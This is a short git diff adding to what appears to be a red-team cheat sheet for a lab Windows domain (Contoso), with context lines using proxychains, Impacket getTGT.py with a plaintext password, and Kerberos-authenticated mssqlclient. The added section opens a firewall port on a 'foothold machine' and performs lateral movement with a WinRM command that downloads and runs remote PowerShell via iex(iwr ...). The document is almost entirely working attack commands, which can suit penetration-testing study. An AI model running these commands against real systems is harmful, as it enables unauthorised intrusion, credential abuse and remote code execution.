@@ -37,3 +37,17 @@ proxychains getTGT.py 'CONTOSO.COM/rsteel:Passw0rd!' -dc-ip 10.10.120.1
 
 proxychains mssqlclient.py contoso.com/rsteel@lon-db-1 -windows-auth -no-pass -k -dc-ip 10.10.120.1
 ```
+
+---
+
+##### Reverse Port Forward
+
+Create port forward on foothold machine
+```powershell
+run netsh advfirewall firewall add rule name="Debug" dir=in action=allow protocol=TCP localport=28190
+```
+
+Perform lateral movement
+```powershell
+remote-exec winrm lon-ws-1 iex(iwr http://lon-wkstn-1:28190/test -useb)
+```
